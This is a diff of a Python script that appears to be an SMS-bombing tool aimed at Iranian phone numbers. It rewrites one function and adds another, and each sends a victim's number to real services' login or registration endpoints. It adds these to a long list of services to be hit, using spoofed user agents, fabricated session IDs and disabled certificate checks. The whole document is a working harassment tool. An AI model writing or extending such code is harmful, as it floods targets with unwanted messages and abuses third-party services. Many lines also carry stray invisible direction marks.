@@ -1435,20 +1435,81 @@ def bimebazar(phone):
         print(f'{r}[!] Bimebazar Exception: {e}{a}')
         return False
 
-def komodaa(phone):
-    url = "https://api.komodaa.com/api/v2.6/loginRC/request"
-    payload = {"phone_number": "0" + phone.split("+98")[1]}
-    try:
-        response = post(url, json=payload, timeout=5)
-        if response.status_code == 200:
-            print(f'{g}(Komodaa) {a}Code Sent')
-            return True
-        else:
-            print(f'{r}[-] (Komodaa) Failed or No Response{a}')
-    except Exception as e:
-        print(f'{r}[!] Komodaa Exception: {e}{a}')
-        return False
+‏def sibapp(phone):
+‏    try:
+‏        url = "https://api.sibapp.net/api/v1/user/register"
+‏        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+‏        formatted_phone = f"0{formatted_phone}"
+        
+‏        headers = {
+‏            "accept": "application/json, text/plain, */*",
+‏            "content-type": "application/json; charset=UTF-8",
+‏            "cache-control": "no-cache",
+‏            "user-agent": random.choice(user_agents),
+        }
+        
+‏        payload = {
+‏            "phone_number": formatted_phone
+        }
+        
+‏        response = requests.post(
+‏            url, 
+‏            json=payload, 
+‏            headers=headers, 
+‏            timeout=10,
+‏            verify=False
+        )
+        
+‏        if response.status_code in [200, 201]:
+‏            print(f'{g}(sibapp) sms sent successfully!{a}')
+‏            return True
+‏        else:
+‏            print(f'{r}[-] sibapp error: {response.status_code}{a}')
+‏            return False
+            
+‏    except Exception as e:
+‏        print(f'{r}[!] sibapp exception: {e}{a}')
+‏        return False
 
+‏def komodaa(phone):
+‏    try:
+‏        url = "https://api.komodaa.com/api/v2.6/loginrc/request"
+‏        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+‏        formatted_phone = f"0{formatted_phone}"
+        
+‏        headers = {
+‏            "accept": "application/json",
+‏            "content-type": "application/json",
+‏            "web-user-agent": "komodaa/7.0.1.301 mozilla/5.0 (iphone; cpu iphone os 18_6 like mac os x) applewebkit/605.1.15 (khtml, like gecko) version/18.6 mobile/15e148 safari/604.1",
+‏            "install-ref": "web",
+‏            "k-session-id": f"{uuid.uuid4().hex}-{uuid.uuid4().hex[:12]}",
+‏            "user-agent": "mozilla/5.0 (iphone; cpu iphone os 18_6 like mac os x) applewebkit/605.1.15 (khtml, like gecko) version/18.6 mobile/15e148 safari/604.1"
+        }
+        
+‏        payload = {
+‏            "phone_number": formatted_phone
+        }
+        
+‏        response = requests.post(
+‏            url, 
+‏            json=payload, 
+‏            headers=headers, 
+‏            timeout=10,
+‏            verify=False
+        )
+        
+‏        if response.status_code in [200, 201]:
+‏            print(f'{g}(komodaa) sms sent successfully!{a}')
+‏            return True
+‏        else:
+‏            print(f'{r}[-] komodaa error: {response.status_code}{a}')
+‏            return False
+            
+‏    except Exception as e:
+‏        print(f'{r}[!] komodaa exception: {e}{a}')
+‏        return False
+
+ 
 def alopeyk_safir(phone):
     url = "https://api.alopeyk.com/safir-service/api/v1/login"
     payload = {"phone": "0" + phone.split("+98")[1]}
@@ -2040,11 +2101,11 @@ services = [
     ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
     komodaa, Koohshid, mahabadperfume, malltina, mek,
     missomister, mo7_ir, mobilex, mootanroo, mrbilit,
-    niktakala, Okala, okorosh, paklean_call,
+    niktakala, Nillarayeshi, Okala, okorosh, paklean_call,
     payonshoes, pindo, ragham_call, riiha, Sandalestan,
     shahrfarsh, ShahreSandal, snap, snapp_market, snappshop,
-    tapsi_food, tetherland, theshoes, torobpay, trip,
-    trip_call, vitrin_shop
+    sibapp, tapsi_food, tetherland, theshoes, torobpay,
+    trip, trip_call, vitrin_shop
 ]
 
           
